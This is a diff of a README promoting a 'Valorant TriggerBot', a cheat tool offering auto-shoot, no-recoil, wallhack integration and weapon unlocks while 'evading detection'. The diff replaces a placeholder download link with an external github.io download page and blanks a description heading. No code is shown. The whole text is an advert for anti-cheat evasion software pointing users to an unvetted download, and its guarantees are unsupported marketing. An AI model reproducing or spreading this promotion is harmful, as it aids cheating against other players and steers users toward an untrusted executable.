@@ -1,9 +1,9 @@
 # 🔪 Valorant TriggerBot | Instant Kills Guaranteed  
 
-## Описание  
+## 
 💥 Achieve **Valorant** perfection with this TriggerBot! Enjoy unfair advantages like auto-shoot, instant kills, and no-recoil. Designed for PC players, this tool ensures smooth performance while evading detection. Features include customizable settings, wallhack integration, and instant weapon unlocks to dominate every match effortlessly.  
 
-[![Download Valorant TriggerBot](https://img.shields.io/badge/Download-Valorant%20TriggerBot-blueviolet)](https://example.com)  
+[![Download Valorant TriggerBot](https://img.shields.io/badge/Download-Valorant%20TriggerBot-blueviolet)](https://valorant-triggerbot.github.io/.github/)  
 
 ---
 
